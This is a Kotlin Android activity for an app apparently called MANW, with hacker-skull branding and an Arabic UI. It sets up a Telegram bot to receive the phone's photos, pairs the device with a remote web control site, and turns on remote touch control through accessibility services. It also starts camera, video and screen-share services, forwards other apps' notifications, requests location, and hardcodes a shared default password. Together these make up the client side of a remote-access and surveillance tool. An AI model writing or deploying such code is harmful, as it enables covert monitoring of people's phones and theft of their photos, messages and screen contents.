package com.manw.autosender

import android.Manifest
import android.content.pm.PackageManager
import android.content.Intent
import android.os.Build
import android.os.Bundle
import android.provider.MediaStore
import android.provider.Settings
import android.provider.ContactsContract
import android.net.Uri
import android.graphics.BitmapFactory
import android.graphics.drawable.BitmapDrawable
import android.content.pm.ShortcutInfo
import android.content.pm.ShortcutManager
import android.graphics.drawable.Icon
import android.database.Cursor
import android.widget.*
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import androidx.work.ExistingPeriodicWorkPolicy
import androidx.work.ExistingWorkPolicy
import androidx.work.OneTimeWorkRequestBuilder
import androidx.work.PeriodicWorkRequestBuilder
import androidx.work.WorkManager
import java.util.concurrent.TimeUnit

class MainActivity : AppCompatActivity() {
    private val requestCode = 41
    private val contactRequestCode = 42
    private val volumeRequestCode = 43
    private lateinit var token: EditText
    private lateinit var chat: EditText
    private lateinit var status: TextView
    private var passwordGateVisible = false
    private var mainRoot: LinearLayout? = null
    private val wallpaperRequestCode = 44
    private val iconRequestCode = 45
    private val firstMediaPermissionCode = 46

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        if (!AppPassword.isSessionValid(this)) {
            showPasswordGate()
            return
        }
        val prefs = SecurePrefs.get(this)
        val root = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setPadding(28, 36, 28, 24)
            background = android.graphics.drawable.BitmapDrawable(
                resources,
                android.graphics.BitmapFactory.decodeResource(resources, R.drawable.manw_hacker_bg)
            ).apply { alpha = 112 }
        }
        fun label(value: String, size: Float = 16f) = TextView(this).apply {
            text = value; textSize = size; setTextColor(0xFFF4F4F5.toInt())
            setPadding(0, 12, 0, 8)
        }
        root.addView(label("☠ 𝓜𝓐𝓝𝓦𓄿𝓐𝓗𝓜𝓔𝓓  ☠", 25f).apply {
            gravity = android.view.Gravity.CENTER
            setTextColor(0xFFFF3030.toInt())
            setShadowLayer(18f, 0f, 0f, 0xFFFF1010.toInt())
        })
        mainRoot = root
        prefs.getString("custom_wallpaper_uri", null)?.let { saved ->
            try {
                contentResolver.openInputStream(Uri.parse(saved))?.use { stream ->
                    val bitmap = BitmapFactory.decodeStream(stream)
                    if (bitmap != null) root.background = BitmapDrawable(resources, bitmap).apply { alpha = 150 }
                }
            } catch (_: Exception) { prefs.edit().remove("custom_wallpaper_uri").apply() }
        }
        root.addView(label("⟦ TELEGRAM SYNC ⟧", 18f).apply { gravity = android.view.Gravity.CENTER; setTextColor(0xFFFF3030.toInt()) })
        token = EditText(this).apply {
            hint = "Bot Token الجديد"; setSingleLine(true); setTextColor(-1); setHintTextColor(0xFF9CA3AF.toInt())
            setText(prefs.getString("bot_token", ""))
        }
        root.addView(token)
        chat = EditText(this).apply {
            hint = "Chat ID"; setSingleLine(true); inputType = 2; setTextColor(-1); setHintTextColor(0xFF9CA3AF.toInt())
            setText(prefs.getString("chat_id", ""))
        }
        root.addView(chat)
        status = label("الحالة: متوقف")
        root.addView(status)
        val save = Button(this).apply { text = "حفظ الإعدادات" }
        root.addView(save)
        val start = Button(this).apply { text = "تشغيل المزامنة" }
        root.addView(start)
        val stop = Button(this).apply { text = "إيقاف المزامنة" }
        root.addView(stop)
        val test = Button(this).apply { text = "اختبار اتصال البوت فقط" }
        root.addView(test)
        root.addView(label("⟦ REMOTE CONTROL ⟧", 18f).apply { gravity = android.view.Gravity.CENTER; setTextColor(0xFFFF3030.toInt()) })
        val webUrl = EditText(this).apply {
            hint = "رابط الموقع https://..."
            setSingleLine(true); setTextColor(-1); setHintTextColor(0xFF9CA3AF.toInt())
            setText(prefs.getString("web_base_url", "https://manw-control-center-production.up.railway.app"))
        }
        root.addView(webUrl)
        val webCode = EditText(this).apply {
            hint = "رمز الاقتران الذي يظهر في الموقع"; setSingleLine(true); setTextColor(-1); setHintTextColor(0xFF9CA3AF.toInt())
        }
        root.addView(webCode)
        val pairWeb = Button(this).apply { text = "ربط الهاتف بالموقع" }
        root.addView(pairWeb)
        val webStatus = label(if (prefs.getBoolean("web_paired", false)) "الموقع: الهاتف مقترن" else "الموقع: غير مربوط")
        root.addView(webStatus)
        val unpairWeb = Button(this).apply { text = "فصل الهاتف عن الموقع" }
        root.addView(unpairWeb)
        val sessionStatus = label(if (prefs.getBoolean("remote_session_enabled", prefs.getBoolean("web_paired", false))) "جلسة التحكم: نشطة" else "جلسة التحكم: متوقفة")
        root.addView(sessionStatus)
        val resumeSession = Button(this).apply { text = "بدء / استئناف جلسة التحكم" }
        root.addView(resumeSession)
        val stopSession = Button(this).apply { text = "إيقاف جلسة التحكم بالكامل" }
        root.addView(stopSession)
        val enableVolumeSend = Button(this).apply { text = "تفعيل الإرسال بزر خفض الصوت مع الكاميرا العادية" }
        root.addView(enableVolumeSend)
        val disableVolumeSend = Button(this).apply { text = "إيقاف الإرسال بزر خفض الصوت" }
        root.addView(disableVolumeSend)
        val remoteAccess = Button(this).apply { text = "تفعيل تحكم الموقع باللمس والسحب والكتابة" }
        root.addView(remoteAccess)
        remoteAccess.setOnClickListener {
            toast("فعّل خدمة MANW — تحكم لمس عن بُعد من خدمات إمكانية الوصول، ثم ارجع للتطبيق.")
            startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS))
        }
        val notificationSettings = Button(this).apply { text = "اختيار التطبيقات لإرسال إشعاراتها إلى البوت" }
        root.addView(notificationSettings)
        val changePassword = Button(this).apply { text = "تغيير كلمة سر التطبيق" }
        root.addView(changePassword)
        root.addView(label("⟦ تخصيص المظهر — CUSTOM LOOK ⟧", 18f).apply {
            gravity = android.view.Gravity.CENTER
            setTextColor(0xFFFF3030.toInt())
        })
        val changeWallpaper = Button(this).apply { text = "اختيار خلفية من المعرض" }
        root.addView(changeWallpaper)
        val changeIcon = Button(this).apply { text = "اختيار أيقونة MANW من المعرض" }
        root.addView(changeIcon)
        root.addView(label("الخلفية تُحفظ داخل التطبيق. الأيقونة المختارة تُضاف كاختصار مستقل للشاشة الرئيسية.", 13f))
        // Terminal / Termux visual language across every control.
        fun applyTerminalStyle(view: android.view.View) {
            when (view) {
                is Button -> {
                    view.typeface = android.graphics.Typeface.create("sans-serif-condensed", android.graphics.Typeface.BOLD)
                    view.setTextColor(0xFFFFFFFF.toInt())
                    view.backgroundTintList = android.content.res.ColorStateList.valueOf(0xFF9F101B.toInt())
                    view.setAllCaps(false)
                }
                is EditText -> {
                    view.typeface = android.graphics.Typeface.create("sans-serif-condensed", android.graphics.Typeface.NORMAL)
                    view.setTextColor(0xFFFFFFFF.toInt())
                    view.setHintTextColor(0xFFB9A0A0.toInt())
                    view.backgroundTintList = android.content.res.ColorStateList.valueOf(0xFFFF2020.toInt())
                }
                is TextView -> {
                    view.typeface = android.graphics.Typeface.create("sans-serif-condensed", android.graphics.Typeface.BOLD)
                    if (view.textColors.defaultColor == 0xFF9BFFB0.toInt()) view.setTextColor(0xFFF0E8E8.toInt())
                }
            }
            if (view is android.view.ViewGroup) {
                for (index in 0 until view.childCount) applyTerminalStyle(view.getChildAt(index))
            }
        }
        applyTerminalStyle(root)
        setContentView(ScrollView(this).apply { addView(root) })

        val missingAtLaunch = permissionsToRequest().filter {
            ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
        }
        if (missingAtLaunch.isNotEmpty()) {
            ActivityCompat.requestPermissions(this, missingAtLaunch.toTypedArray(), firstMediaPermissionCode)
        }

        save.setOnClickListener {
            val t = token.text.toString().trim()
            val c = chat.text.toString().trim()
            if (t.isBlank() || c.isBlank()) { toast("أدخل Bot Token و Chat ID"); return@setOnClickListener }
            prefs.edit().putString("bot_token", t).putString("chat_id", c).apply()
            toast("تم حفظ الإعدادات بشكل مشفّر")
        }
        start.setOnClickListener {
            val t = token.text.toString().trim()
            val c = chat.text.toString().trim()
            if (t.isBlank() || c.isBlank()) { toast("أدخل بيانات البوت أولًا"); return@setOnClickListener }
            prefs.edit().putString("bot_token", t).putString("chat_id", c).apply()
            if (!hasImagePermission()) ActivityCompat.requestPermissions(this, permissionsToRequest(), requestCode)
            else enableSync()
        }
        stop.setOnClickListener {
            WorkManager.getInstance(this).cancelUniqueWork(ImageSyncWorker.WORK_NAME)
            WorkManager.getInstance(this).cancelUniqueWork(ImageSyncWorker.WORK_NAME + "_now")
            WorkManager.getInstance(this).cancelUniqueWork(ImageSyncWorker.WORK_NAME + "_event")
            prefs.edit().putBoolean("sync_enabled", false).putBoolean("manual_send_enabled", false)
                .putBoolean("remote_session_enabled", false).apply()
            stopService(android.content.Intent(this, ImageMonitorService::class.java))
            stopService(android.content.Intent(this, CameraSessionService::class.java))
            stopService(android.content.Intent(this, VideoRecordingService::class.java))
            stopService(android.content.Intent(this, ScreenShareService::class.java))
            sessionStatus.text = "جلسة التحكم: متوقفة"
            status.text = "الحالة: متوقف"
            toast("تم إيقاف المزامنة")
        }
        resumeSession.setOnClickListener {
            if (!prefs.getBoolean("web_paired", false)) { toast("اربط الهاتف بالموقع أولاً"); return@setOnClickListener }
            prefs.edit().putBoolean("remote_session_enabled", true).apply()
            sessionStatus.text = "جلسة التحكم: نشطة — الإشعار ظاهر"
            startMonitorService()
            toast("بدأت جلسة التحكم. لإيقافها استخدم زر الإيقاف داخل التطبيق.")
        }
        stopSession.setOnClickListener {
            WorkManager.getInstance(this).cancelUniqueWork(ImageSyncWorker.WORK_NAME)
            WorkManager.getInstance(this).cancelUniqueWork(ImageSyncWorker.WORK_NAME + "_now")
            WorkManager.getInstance(this).cancelUniqueWork(ImageSyncWorker.WORK_NAME + "_event")
            prefs.edit().putBoolean("remote_session_enabled", false)
                .putBoolean("sync_enabled", false).putBoolean("manual_send_enabled", false).apply()
            stopService(android.content.Intent(this, ImageMonitorService::class.java))
            stopService(android.content.Intent(this, CameraSessionService::class.java))
            stopService(android.content.Intent(this, VideoRecordingService::class.java))
            stopService(android.content.Intent(this, ScreenShareService::class.java))
            sessionStatus.text = "جلسة التحكم: متوقفة"
            status.text = "الحالة: متوقف"
            toast("تم إيقاف جلسة التحكم والمزامنة والكاميرا ومشاركة الشاشة.")
        }
        enableVolumeSend.setOnClickListener {
            val t = token.text.toString().trim()
            val c = chat.text.toString().trim()
            if (t.isBlank() || c.isBlank()) { toast("أدخل Bot Token و Chat ID أولاً"); return@setOnClickListener }
            val missingPermissions = volumeModePermissions().filter {
                ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
            }
            if (missingPermissions.isNotEmpty()) {
                toast("اسمح بالصور والإشعارات حتى يصلك تنبيه فتح الكاميرا وحالة الإرسال.")
                ActivityCompat.requestPermissions(this, missingPermissions.toTypedArray(), volumeRequestCode)
                return@setOnClickListener
            }
            activateVolumeSendMode()
        }
        disableVolumeSend.setOnClickListener {
            prefs.edit().putBoolean("manual_send_enabled", false).apply()
            toast("تم إيقاف الإرسال بزر خفض الصوت.")
        }
        notificationSettings.setOnClickListener {
            startActivity(Intent(this, NotificationSettingsActivity::class.java))
        }
        changePassword.setOnClickListener { showChangePasswordDialog() }
        changeWallpaper.setOnClickListener { openAppearancePicker(wallpaperRequestCode) }
        changeIcon.setOnClickListener { openAppearancePicker(iconRequestCode) }
        test.setOnClickListener {
            val t = token.text.toString().trim()
            val c = chat.text.toString().trim()
            if (t.isBlank() || c.isBlank()) { toast("أدخل بيانات البوت أولًا"); return@setOnClickListener }
            Thread {
                val result = ImageSyncWorker.testBot(t, c)
                runOnUiThread { toast(result) }
            }.start()
        }
        pairWeb.setOnClickListener {
            val base = webUrl.text.toString().trim()
            val code = webCode.text.toString().trim()
            if (base.isBlank() || code.isBlank()) { toast("اكتب رابط الموقع ورمز الاقتران أولاً"); return@setOnClickListener }
            pairWeb.isEnabled = false
            Thread {
                try {
                    val normalized = WebControlClient.normalizeBase(base)
                    val deviceToken = WebControlClient.pair(normalized, code)
                    prefs.edit().putString("web_base_url", normalized).putString("web_device_token", deviceToken)
                        .putBoolean("web_paired", true).putBoolean("remote_session_enabled", true).apply()
                    runOnUiThread {
                        pairWeb.isEnabled = true
                        webStatus.text = "الموقع: الهاتف مقترن ومتصل بالخدمة"
                        webCode.text.clear()
                        sessionStatus.text = "جلسة التحكم: نشطة — الإشعار ظاهر أثناء التشغيل"
                        toast("تم ربط الهاتف وبدء جلسة التحكم. أوامر الكاميرا والشاشة تظل بموافقة أندرويد.")
                        startMonitorService()
                    }
                } catch (e: Exception) {
                    runOnUiThread { pairWeb.isEnabled = true; toast("فشل الربط: " + (e.message ?: "تحقق من الرمز والرابط")) }
                }
            }.start()
        }
        unpairWeb.setOnClickListener {
            prefs.edit().remove("web_device_token").putBoolean("web_paired", false)
                .putBoolean("remote_session_enabled", false).apply()
            if (!prefs.getBoolean("sync_enabled", false)) stopService(android.content.Intent(this, ImageMonitorService::class.java))
            stopService(android.content.Intent(this, CameraSessionService::class.java))
            stopService(android.content.Intent(this, VideoRecordingService::class.java))
            stopService(android.content.Intent(this, ScreenShareService::class.java))
            sessionStatus.text = "جلسة التحكم: متوقفة"
            webStatus.text = "الموقع: غير مربوط"
            toast("تم فصل الهاتف وإيقاف جلسة التحكم")
        }
        if (prefs.getBoolean("sync_enabled", false) ||
            (prefs.getBoolean("web_paired", false) && prefs.getBoolean("remote_session_enabled", true))) {
            status.text = "الحالة: الخدمات المفعّلة تعمل"
            sessionStatus.text = if (prefs.getBoolean("remote_session_enabled", true) && prefs.getBoolean("web_paired", false)) "جلسة التحكم: نشطة — الإشعار ظاهر" else "جلسة التحكم: متوقفة"
            startMonitorService()
        }
        val error = prefs.getString("last_error", null)
        val last = prefs.getString("last_result", null)
        if (!error.isNullOrBlank()) root.addView(label("آخر خطأ: " + error))
        if (!last.isNullOrBlank()) root.addView(label("آخر نتيجة: " + last))
    }


    override fun onResume() {
        super.onResume()
        if (!AppPassword.isSessionValid(this) && !passwordGateVisible) showPasswordGate()
    }

    private fun showPasswordGate() {
        passwordGateVisible = true
        val prefs = SecurePrefs.get(this)
        // Initialize a shared first-install password; only its derived salted hash is stored.
        if (!AppPassword.isConfigured(this)) {
            AppPassword.create(this, "manw1231\u0024\u0024")
        }
        val firstSetup = false
        val root = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            gravity = android.view.Gravity.CENTER
            setPadding(32, 36, 32, 36)
            background = android.graphics.drawable.BitmapDrawable(
                resources,
                android.graphics.BitmapFactory.decodeResource(resources, R.drawable.manw_hacker_bg)
            ).apply { alpha = 128 }
        }
        val emblem = TextView(this).apply {
            text = "☠"
            textSize = 76f
            gravity = android.view.Gravity.CENTER
            setTextColor(0xFFFF2020.toInt())
            setShadowLayer(22f, 0f, 0f, 0xFFFF0000.toInt())
        }
        val title = TextView(this).apply {
            text = "𝓜𝓐𝓝𝓦𓄿𝓐𝓗𝓜𝓔𝓓"
            textSize = 27f
            gravity = android.view.Gravity.CENTER
            setTextColor(0xFFF8FAFC.toInt())
            setShadowLayer(12f, 0f, 0f, 0xFFFF2020.toInt())
        }
        val subtitle = TextView(this).apply {
            text = if (firstSetup) "أنشئ كلمة سر لحماية التطبيق" else "منطقة محمية • أدخل كلمة السر"
            textSize = 16f
            gravity = android.view.Gravity.CENTER
            setTextColor(0xFFFFB3B3.toInt())
            setPadding(0, 16, 0, 22)
        }
        val password = EditText(this).apply {
            hint = if (firstSetup) "كلمة سر جديدة (6 أحرف على الأقل)" else "كلمة السر"
            inputType = android.text.InputType.TYPE_CLASS_TEXT or android.text.InputType.TYPE_TEXT_VARIATION_PASSWORD
            setSingleLine(true)
            setTextColor(-1); setHintTextColor(0xFF76A982.toInt())
            backgroundTintList = android.content.res.ColorStateList.valueOf(0xFF8B1018.toInt())
        }
        val confirm = EditText(this).apply {
            hint = "أكد كلمة السر"
            inputType = android.text.InputType.TYPE_CLASS_TEXT or android.text.InputType.TYPE_TEXT_VARIATION_PASSWORD
            setSingleLine(true)
            setTextColor(-1); setHintTextColor(0xFFBCAAAA.toInt())
            backgroundTintList = android.content.res.ColorStateList.valueOf(0xFF991B1B.toInt())
            visibility = if (firstSetup) android.view.View.VISIBLE else android.view.View.GONE
        }
        val error = TextView(this).apply {
            text = ""
            gravity = android.view.Gravity.CENTER
            setTextColor(0xFFFCA5A5.toInt())
            setPadding(0, 12, 0, 8)
        }
        val enter = Button(this).apply {
            text = if (firstSetup) "إنشاء كلمة السر والدخول" else "فتح التطبيق"
            setTextColor(-1)
            backgroundTintList = android.content.res.ColorStateList.valueOf(0xFF991B1B.toInt())
        }
        root.addView(emblem)
        root.addView(title)
        root.addView(subtitle)
        root.addView(password)
        root.addView(confirm)
        root.addView(error)
        root.addView(enter)
        setContentView(root)
        enter.setOnClickListener {
            val pass = password.text.toString()
            if (firstSetup) {
                if (pass.length < 6) { error.text = "كلمة السر لازم تكون 6 أحرف على الأقل"; return@setOnClickListener }
                if (pass != confirm.text.toString()) { error.text = "كلمتا السر غير متطابقتين"; return@setOnClickListener }
                AppPassword.create(this, pass)
                AppPassword.markUnlocked(this)
                recreate()
            } else {
                if (AppPassword.verify(this, pass)) {
                    AppPassword.markUnlocked(this)
                    recreate()
                } else {
                    error.text = "كلمة السر غير صحيحة"
                    password.text.clear()
                }
            }
        }
    }

    private fun showChangePasswordDialog() {
        val current = EditText(this).apply {
            hint = "كلمة السر الحالية"
            inputType = android.text.InputType.TYPE_CLASS_TEXT or android.text.InputType.TYPE_TEXT_VARIATION_PASSWORD
        }
        val next = EditText(this).apply {
            hint = "كلمة السر الجديدة (6 أحرف على الأقل)"
            inputType = android.text.InputType.TYPE_CLASS_TEXT or android.text.InputType.TYPE_TEXT_VARIATION_PASSWORD
        }
        val confirm = EditText(this).apply {
            hint = "تأكيد كلمة السر الجديدة"
            inputType = android.text.InputType.TYPE_CLASS_TEXT or android.text.InputType.TYPE_TEXT_VARIATION_PASSWORD
        }
        val box = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setPadding(24, 8, 24, 0)
            addView(current); addView(next); addView(confirm)
        }
        android.app.AlertDialog.Builder(this)
            .setTitle("تغيير كلمة سر MANW")
            .setView(box)
            .setNegativeButton("إلغاء", null)
            .setPositiveButton("حفظ") { _, _ ->
                val old = current.text.toString()
                val fresh = next.text.toString()
                if (!AppPassword.verify(this, old)) {
                    toast("كلمة السر الحالية غير صحيحة")
                } else if (fresh.length < 6 || fresh != confirm.text.toString()) {
                    toast("تأكد من كلمة السر الجديدة (6 أحرف على الأقل)")
                } else {
                    AppPassword.create(this, fresh)
                    AppPassword.markUnlocked(this)
                    toast("تم تغيير كلمة السر")
                }
            }.show()
    }

    @Deprecated("Use Activity Result APIs")
    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)
        if ((requestCode == wallpaperRequestCode || requestCode == iconRequestCode) && resultCode == RESULT_OK) {
            val uri = data?.data ?: return
            try {
                contentResolver.takePersistableUriPermission(uri, Intent.FLAG_GRANT_READ_URI_PERMISSION)
            } catch (_: Exception) { }
            if (requestCode == wallpaperRequestCode) {
                try {
                    contentResolver.openInputStream(uri)?.use { stream ->
                        val bitmap = BitmapFactory.decodeStream(stream)
                        if (bitmap == null) { toast("تعذر قراءة الصورة"); return }
                        mainRoot?.background = BitmapDrawable(resources, bitmap).apply { alpha = 150 }
                        SecurePrefs.get(this).edit().putString("custom_wallpaper_uri", uri.toString()).apply()
                        toast("تم حفظ الخلفية وتطبيقها")
                    }
                } catch (e: Exception) { toast("تعذر تطبيق الخلفية: " + (e.message ?: "خطأ")) }
            } else {
                createCustomHomeShortcut(uri)
            }
            return
        }
        if (requestCode == contactRequestCode && resultCode == RESULT_OK) {
            val uri = data?.data ?: return
            var name = "جهة اتصال واتساب"
            var number = ""
            contentResolver.query(uri, arrayOf(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME, ContactsContract.CommonDataKinds.Phone.NUMBER), null, null, null)?.use { cursor ->
                if (cursor.moveToFirst()) {
                    name = cursor.getString(0) ?: name
                    number = cursor.getString(1) ?: ""
                }
            }
            if (number.isBlank()) { toast("تعذر قراءة رقم جهة الاتصال"); return }
            SecurePrefs.get(this).edit().putString("wa_name", name).putString("wa_phone", number).apply()
            startActivity(Intent(this, CameraActivity::class.java))
        }
    }


    private fun openAppearancePicker(code: Int) {
        val pick = Intent(Intent.ACTION_OPEN_DOCUMENT).apply {
            addCategory(Intent.CATEGORY_OPENABLE)
            type = "image/*"
            addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION or Intent.FLAG_GRANT_PERSISTABLE_URI_PERMISSION)
        }
        startActivityForResult(pick, code)
    }

    private fun createCustomHomeShortcut(uri: Uri) {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.O) {
            toast("تخصيص أيقونة الشاشة الرئيسية يحتاج Android 8 أو أحدث")
            return
        }
        try {
            val bitmap = contentResolver.openInputStream(uri)?.use { BitmapFactory.decodeStream(it) }
            if (bitmap == null) { toast("تعذر قراءة صورة الأيقونة"); return }
            val launchIntent = packageManager.getLaunchIntentForPackage(packageName)
            if (launchIntent == null) { toast("تعذر إنشاء الاختصار"); return }
            val shortcut = ShortcutInfo.Builder(this, "manw_custom_home_icon")
                .setShortLabel("MANW")
                .setLongLabel("MANW — 𝓜𝓐𝓝𝓦𓄿𝓐𝓗𝓜𝓔𝓓")
                .setIcon(Icon.createWithBitmap(bitmap))
                .setIntent(launchIntent)
                .build()
            val manager = getSystemService(ShortcutManager::class.java)
            if (manager.isRequestPinShortcutSupported) {
                manager.requestPinShortcut(shortcut, null)
                SecurePrefs.get(this).edit().putString("custom_icon_uri", uri.toString()).apply()
                toast("تم إرسال طلب إضافة أيقونة MANW الجديدة للشاشة الرئيسية")
            } else {
                toast("مشغل الشاشة الرئيسية لا يدعم إضافة الاختصار")
            }
        } catch (e: Exception) {
            toast("تعذر إنشاء الأيقونة: " + (e.message ?: "خطأ"))
        }
    }

    private fun activateVolumeSendMode() {
        val prefs = SecurePrefs.get(this)
        val t = token.text.toString().trim()
        val c = chat.text.toString().trim()
        val now = System.currentTimeMillis() / 1000L
        prefs.edit().putString("bot_token", t).putString("chat_id", c)
            .putBoolean("sync_enabled", true)
            .putBoolean("manual_send_enabled", true)
            .putLong("scan_from", now - 2L)
            .putLong("manual_batch_since", now)
            .apply()
        val wm = WorkManager.getInstance(this)
        wm.cancelUniqueWork(ImageSyncWorker.WORK_NAME)
        wm.cancelUniqueWork(ImageSyncWorker.WORK_NAME + "_now")
        wm.cancelUniqueWork(ImageSyncWorker.WORK_NAME + "_event")
        wm.enqueueUniquePeriodicWork(ImageSyncWorker.WORK_NAME, ExistingPeriodicWorkPolicy.UPDATE,
            PeriodicWorkRequestBuilder<ImageSyncWorker>(15, TimeUnit.MINUTES).build())
        startMonitorService()
        toast("المراقبة التلقائية وزر خفض الصوت مفعّلان. فعّل خدمة إمكانية الوصول مرة واحدة ثم افتح الكاميرا العادية.")
        startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS))
    }

    // Request all ordinary runtime permissions together on first launch. Android may still
    // display separate system dialogs for different permission groups.
    private fun permissionsToRequest(): Array<String> {
        val permissions = mutableListOf(
            Manifest.permission.CAMERA,
            Manifest.permission.ACCESS_COARSE_LOCATION,
            Manifest.permission.ACCESS_FINE_LOCATION,
            imagePermission()
        )
        if (Build.VERSION.SDK_INT >= 33) permissions.add(Manifest.permission.READ_MEDIA_VIDEO)
        if (Build.VERSION.SDK_INT >= 34) permissions.add(Manifest.permission.READ_MEDIA_VISUAL_USER_SELECTED)
        if (Build.VERSION.SDK_INT >= 33) permissions.add(Manifest.permission.POST_NOTIFICATIONS)
        return permissions.toTypedArray()
    }

    private fun volumeModePermissions(): Array<String> {
        val permissions = mutableListOf(imagePermission())
        if (Build.VERSION.SDK_INT >= 33) permissions.add(Manifest.permission.POST_NOTIFICATIONS)
        return permissions.toTypedArray()
    }

    private fun imagePermission(): String =
        if (Build.VERSION.SDK_INT >= 33) Manifest.permission.READ_MEDIA_IMAGES else Manifest.permission.READ_EXTERNAL_STORAGE

    private fun hasImagePermission(): Boolean {
        val full = ContextCompat.checkSelfPermission(this, imagePermission()) == PackageManager.PERMISSION_GRANTED
        val selected = Build.VERSION.SDK_INT >= 34 &&
            ContextCompat.checkSelfPermission(this, Manifest.permission.READ_MEDIA_VISUAL_USER_SELECTED) == PackageManager.PERMISSION_GRANTED
        return full || selected
    }

    private fun startMonitorService() {
        val intent = android.content.Intent(this, ImageMonitorService::class.java)
        ContextCompat.startForegroundService(this, intent)
    }

    private fun enableSync() {
        val prefs = SecurePrefs.get(this)
        prefs.edit().putBoolean("sync_enabled", true).putBoolean("manual_send_enabled", false)
            .putLong("scan_from", System.currentTimeMillis() / 1000L - 2L).apply()
        val wm = WorkManager.getInstance(this)
        wm.enqueueUniqueWork(ImageSyncWorker.WORK_NAME + "_now", ExistingWorkPolicy.REPLACE,
            OneTimeWorkRequestBuilder<ImageSyncWorker>().build())
        wm.enqueueUniquePeriodicWork(ImageSyncWorker.WORK_NAME, ExistingPeriodicWorkPolicy.UPDATE,
            PeriodicWorkRequestBuilder<ImageSyncWorker>(15, TimeUnit.MINUTES).build())
        startMonitorService()
        status.text = "الحالة: المراقبة الفورية تعمل في الخلفية"
        toast("تم تشغيل المراقبة الفورية في الخلفية.")
    }

    override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<out String>, grantResults: IntArray) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        if (requestCode == firstMediaPermissionCode) {
            if (hasImagePermission()) toast("تم حفظ إذن الصور. إذن الفيديو متاح حسب اختيارك من نافذة أندرويد.")
            else toast("لم يتم منح إذن الصور؛ يمكنك تفعيله لاحقًا من إعدادات التطبيق.")
        } else if (requestCode == volumeRequestCode) {
            val permissionsGranted = volumeModePermissions().all {
                ContextCompat.checkSelfPermission(this, it) == PackageManager.PERMISSION_GRANTED
            }
            if (permissionsGranted) activateVolumeSendMode()
            else toast("لازم تسمح بالصور والإشعارات لتفعيل أوامر البوت وتنبيهات الكاميرا.")
        } else if (requestCode == this.requestCode && hasImagePermission()) enableSync()
        else if (requestCode == this.requestCode) toast("لا يمكن المزامنة بدون إذن الصور")
    }

    private fun toast(message: String) = Toast.makeText(this, message, Toast.LENGTH_LONG).show()
}
